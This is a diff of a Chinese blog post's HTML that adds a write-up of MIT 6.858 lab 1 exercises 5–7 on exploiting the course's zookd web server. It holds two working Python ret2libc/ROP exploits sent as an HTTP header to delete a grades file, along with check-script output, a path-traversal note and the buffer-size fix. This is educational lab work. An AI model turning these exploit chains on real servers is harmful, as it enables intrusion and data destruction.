@@ -23,11 +23,13 @@
 <meta property="og:site_name" content="Isolator&#39;s Blog">
 <meta property="og:description" content="mit 计算机系统安全实验">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://isolator-1.github.io/img/mit6858/1.jpg">
 <meta property="article:published_time" content="2023-12-06T02:30:00.000Z">
-<meta property="article:modified_time" content="2023-12-06T12:24:37.024Z">
+<meta property="article:modified_time" content="2023-12-07T03:47:06.030Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/mit6858/1.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -235,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.6k words
+          7.9k words
         
       </span>
     
@@ -246,7 +248,7 @@
         
         
         
-          39 mins
+          66 mins
         
       </span>
     
@@ -352,7 +354,30 @@
 
 <h4 id="lab1-exercise5"><a href="#lab1-exercise5" class="headerlink" title="lab1 exercise5"></a>lab1 exercise5</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure>
 
-<p>开了nx，ret2libc。直接来学习一下大佬的exp吧，我以前确实没见过在rop链里通过malloc存储字符串的。</p>
+<p>开了nx，ret2libc。这道题要从<code>/proc/&lt;pid&gt;/maps</code>查看libc被加载到哪（其实都已经gdb了，直接<code>p 某个函数</code>，再减去<code>libc.sym[&#39;xxx&#39;]</code>得到的也一样</p>
+<blockquote>
+<p>在gdb里也可以<code>shell cat /proc/&lt;pid&gt;/maps</code></p>
+</blockquote>
+<p>栈地址和之前是一样的，把字符串放在value上，然后在libc里找<code>pop rdi; ret</code>就行了。exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    unlink = libc_base + libc.sym[<span class="hljs-string">&quot;unlink&quot;</span>]<br>    pop_rdi = libc_base + <span class="hljs-number">0x2e6c5</span> <span class="hljs-comment">#  pop rdi ; ret</span><br><br>    payload = <span class="hljs-string">b&quot;/home/student/grades.txt\x00&quot;</span> <br>    payload += <span class="hljs-string">b&#x27;A&#x27;</span> * (stack_retaddr - stack_buffer - <span class="hljs-built_in">len</span>(payload)) <br>    payload += p64(pop_rdi) + p64(stack_buffer) + p64(unlink)<br><br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += payload + <span class="hljs-string">b&quot;\r\n&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-libc<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>PASS ./exploit-5.py<br></code></pre></td></tr></table></figure>
+
+<p>但是我看了一下大佬的exp，（假设未知value和retaddr），用malloc分配一段地址，靠rax加偏移量去内容的指令完成写入字符串，然后把rax放到rdi里，调用unlink。</p>
+<p>但是在我的libc里，向chunk写入字符串倒是能找到gadget，但是没法把rax挪到rdi里。找不到以rax为src，以任何一个寄存器（非取内容）为dst的<code>mov</code>指令，也找不到形如<code>pop_rax_push_xxx_ret</code>的东西。寄了（</p>
+<p><del>我不李姐为什么同一个vmdk创建的虚拟机libc内容不一样？真不懂😭</del></p>
+<p>虽然但是，还是摆在这学习一下吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>   <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="lab1-exercise6"><a href="#lab1-exercise6" class="headerlink" title="lab1 exercise6"></a>lab1 exercise6</h4><p>题目让再找个漏洞，<del>这显然不是我会的</del></p>
+<p>http_serve存在文件目录穿越漏洞。</p>
+<p><img src="/img/mit6858/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<h4 id="lab1-exercise7"><a href="#lab1-exercise7" class="headerlink" title="lab1 exercise7"></a>lab1 exercise7</h4><p>把value，envvar，reqpath数组大小全部改成8192就好了</p>
+<p>make check-fixed之前的exp全部失效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">./check-crash.sh zookd-exstack ./exploit-2.py<br>./check-crash.sh: line 36:  2730 Killed                  <span class="hljs-variable">$2</span> <span class="hljs-variable">$HOST</span> <span class="hljs-variable">$PORT</span> &gt; /dev/null<br>FAIL ./exploit-2.py<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>FAIL ./exploit-4.py<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>FAIL ./exploit-5.py<br><span class="hljs-built_in">rm</span> shellcode.o<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
